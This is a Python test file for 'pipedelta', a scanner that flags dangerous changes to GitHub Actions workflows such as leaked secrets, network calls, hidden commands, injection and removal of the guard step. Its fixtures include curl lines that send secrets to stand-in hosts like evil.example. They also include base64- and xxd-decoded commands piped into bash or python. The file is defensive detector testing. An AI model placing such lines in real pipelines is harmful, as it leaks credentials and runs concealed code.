"""Detection gaps found in the 18 Nov review. Each test failed on version 0.3."""

import json
import shutil
import subprocess

import pytest

from pipedelta.cli import compare_commits, main
from pipedelta.config import Trust, parse_trust
from pipedelta.delta import compare, overall, pin_fix
from pipedelta.powers import RUNTIME_ADDRESS, network_hosts
from pipedelta.report import render_markdown

BASE = """name: CI
on: push
permissions:
  contents: read
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262
"""


def add(text):
    return BASE + text


def kinds(findings, level=None):
    return {f.power.kind for f in findings if level is None or f.level == level}


# --- secrets ---------------------------------------------------------------


def test_bracket_secret_syntax_is_a_secret():
    after = add("      - run: curl -d \"${{ secrets['AWS_KEY'] }}\" https://evil.example\n")
    findings = compare(BASE, after)
    assert any(f.power.kind == "secret" and f.power.name == "AWS_KEY" for f in findings)
    assert overall(findings) == "high"


# --- network ---------------------------------------------------------------


def test_address_without_https_is_seen():
    assert network_hosts('curl -d "$K" evil.example') == {"evil.example"}
    assert network_hosts("wget evil.example/x.sh") == {"evil.example"}


def test_file_names_after_curl_are_not_addresses():
    hosts = network_hosts("curl -sSL -o out.tar.gz https://github.com/a/b.tar.gz")
    assert hosts == {"github.com"}
    assert network_hosts("curl -T report.json https://up.example") == {"up.example"}


def test_address_from_a_variable_with_a_secret_is_blocked():
    after = add(
        '      - run: curl -s -d "$T" "$REPORT_URL"\n'
        "        env:\n"
        "          T: ${{ secrets.DEPLOY_KEY }}\n"
        "          REPORT_URL: ${{ vars.REPORT_URL }}\n"
    )
    findings = compare(BASE, after)
    assert any(f.power.name == RUNTIME_ADDRESS and f.level == "high" for f in findings)


def test_address_from_a_variable_alone_is_medium():
    after = add('      - run: curl -fsSL "$DOWNLOAD_URL" -o tool\n')
    assert overall(compare(BASE, after)) == "medium"


# --- local actions -----------------------------------------------------------


def test_local_action_reference_is_reported():
    findings = compare(BASE, add("      - uses: ./.github/actions/setup\n"))
    assert "local" in kinds(findings)


COMPOSITE = """name: setup
runs:
  using: composite
  steps:
    - run: echo aGk= | base64 -d | bash
      shell: bash
    - run: curl -d "$TOKEN" https://collector.example
      shell: bash
"""


def test_composite_action_file_is_read():
    findings = compare(None, COMPOSITE)
    assert {"hidden", "network"} <= kinds(findings)
    assert overall(findings) == "high"


def _repo(tmp_path):
    def git(*args):
        out = subprocess.run(
            ["git", *args], cwd=tmp_path, check=True, capture_output=True, text=True
        )
        return out.stdout.strip()

    git("init", "-q", "-b", "main")
    git("config", "user.email", "t@example.com")
    git("config", "user.name", "t")
    (tmp_path / ".github" / "workflows").mkdir(parents=True)
    (tmp_path / ".github" / "workflows" / "ci.yml").write_text(BASE)
    git("add", "-A")
    git("commit", "-qm", "base")
    return git


def test_attack_moved_into_a_repository_action_is_caught(tmp_path, monkeypatch):
    """v0.3 said "no new powers" for this pull request."""
    git = _repo(tmp_path)
    (tmp_path / ".github" / "workflows" / "ci.yml").write_text(
        add("      - uses: ./.github/actions/setup\n")
    )
    action = tmp_path / ".github" / "actions" / "setup"
    action.mkdir(parents=True)
    (action / "action.yml").write_text(COMPOSITE)
    git("add", "-A")
    git("commit", "-qm", "innocent looking refactor")
    monkeypatch.chdir(tmp_path)
    results = compare_commits("HEAD~1", "HEAD")
    assert ".github/actions/setup/action.yml" in results
    assert overall(results[".github/actions/setup/action.yml"]) == "high"


# --- injection ----------------------------------------------------------------


def test_injection_in_github_script_is_seen():
    after = add(
        "      - uses: actions/github-script@60a0d83039c74a4aee543508d2ffcb1c3799cdea\n"
        "        with:\n"
        '          script: console.log("${{ github.event.issue.title }}")\n'
    )
    assert "injection" in kinds(compare(BASE, after), "high")


def test_injection_inside_a_function_is_seen():
    after = add("      - run: echo \"${{ format('{0}', github.event.comment.body) }}\"\n")
    assert "injection" in kinds(compare(BASE, after), "high")


def test_numbers_from_the_event_are_not_injection():
    after = add("      - run: echo ${{ github.event.pull_request.number }}\n")
    assert "injection" not in kinds(compare(BASE, after))


# --- hidden commands ------------------------------------------------------------


@pytest.mark.parametrize(
    "command",
    [
        "echo aGk= | base64 -d | python3",
        "echo 6869 | xxd -r -p | sh",
        'bash -c "$(echo aGk= | base64 --decode)"',
        "python -c \"exec(__import__('base64').b64decode('aGk='))\"",
    ],
)
def test_hidden_commands_are_seen(command):
    assert "hidden" in kinds(compare(BASE, add(f"      - run: {json.dumps(command)}\n")), "high")


# --- runners and containers ---------------------------------------------------------


def test_self_hosted_runner_chosen_through_a_matrix_is_seen():
    after = BASE + (
        "  other:\n"
        "    runs-on: ${{ matrix.r }}\n"
        "    strategy: {matrix: {r: [self-hosted]}}\n"
        "    steps: [{run: echo}]\n"
    )
    assert "runner" in kinds(compare(BASE, after))


def test_outside_container_image_is_reported():
    after = BASE + (
        "  other:\n"
        "    runs-on: ubuntu-latest\n"
        "    container: someone/img:latest\n"
        "    services:\n"
        "      db: {image: postgres:16}\n"
        "    steps: [{run: echo}]\n"
    )
    findings = {f.power.name: f.level for f in compare(BASE, after) if f.power.kind == "container"}
    assert findings == {"someone/img:latest": "medium", "postgres:16": "low"}


# --- removing the check ------------------------------------------------------------


def test_removing_the_pipedelta_step_is_high():
    guarded = add("      - uses: Vachana7/pipedelta@1111111111111111111111111111111111111111\n")
    findings = compare(guarded, BASE)
    assert "guard" in kinds(findings, "high")


# --- fixes ---------------------------------------------------------------------------


def test_unpinned_action_comes_with_a_pin_suggestion():
    findings = compare(BASE, add("      - uses: someone/tool@v2\n"))
    action = next(f for f in findings if f.power.kind == "action")
    assert "someone/tool@<40-character commit id of v2>" in action.fix
    assert pin_fix("a/b@v1", "f" * 40) == f"Lock it to one commit: `uses: a/b@{'f' * 40}  # v1`"


def test_fix_suggestions_appear_in_the_comment():
    text = render_markdown({"ci.yml": compare(BASE, add("      - uses: someone/tool@v2\n"))})
    assert "How to fix" in text
    assert "`uses: someone/tool@" in text


# --- trust list ------------------------------------------------------------------------


def test_trusted_action_and_address_are_lowered():
    trust = parse_trust("trusted-actions: [someone/*]\ntrusted-hosts: [codecov.io]\n")
    after = add(
        "      - uses: someone/tool@v2\n"
        '      - run: curl -s https://uploader.codecov.io -d "$K"\n'
        "        env: {K: '${{ secrets.CODECOV }}'}\n"
    )
    assert overall(compare(BASE, after)) == "high"
    assert overall(compare(BASE, after, trust)) == "medium"  # the secret itself stays medium


def test_a_pull_request_cannot_trust_its_own_additions(tmp_path, monkeypatch):
    git = _repo(tmp_path)
    (tmp_path / ".github" / "workflows" / "ci.yml").write_text(
        add("      - uses: someone/tool@v2\n")
    )
    (tmp_path / ".pipedelta.yml").write_text("trusted-actions: [someone/*]\n")
    git("add", "-A")
    git("commit", "-qm", "trust myself")
    monkeypatch.chdir(tmp_path)
    results = compare_commits("HEAD~1", "HEAD")
    assert overall(results[".github/workflows/ci.yml"]) == "high"
    assert "trust" in kinds(results[".pipedelta.yml"], "medium")


def test_broken_trust_file_trusts_nothing():
    assert parse_trust("trusted-actions: {") == Trust()
    assert parse_trust("- a\n- b\n") == Trust()


# --- output -----------------------------------------------------------------------------


def test_json_output(tmp_path, capsys):
    old, new = tmp_path / "a.yml", tmp_path / "b.yml"
    old.write_text(BASE)
    new.write_text(add("      - uses: someone/tool@v2\n"))
    assert main(["diff", str(old), str(new), "--format", "json"]) == 1
    data = json.loads(capsys.readouterr().out)
    assert data["level"] == "high"
    assert data["files"][str(new)][0]["fix"]


# --- zizmor -------------------------------------------------------------------------------


@pytest.mark.skipif(shutil.which("zizmor") is None, reason="zizmor is not installed")
def test_zizmor_adds_what_pipedelta_misses():
    from pipedelta import zizmor

    before = BASE.replace(
        "actions/checkout@11d5960a326750d5838078e36cf38b85af677262",
        "actions/checkout@11d5960a326750d5838078e36cf38b85af677262\n      - run: make",
    )
    after = before + (
        "      - uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02\n"
        "        with: {name: all, path: .}\n"
    )
    own = compare(before, after)
    merged = zizmor.merge(own, zizmor.new_findings(before, after, "ci.yml"))
    assert any(f.power.kind == "zizmor" and f.power.name == "artipacked" for f in merged)
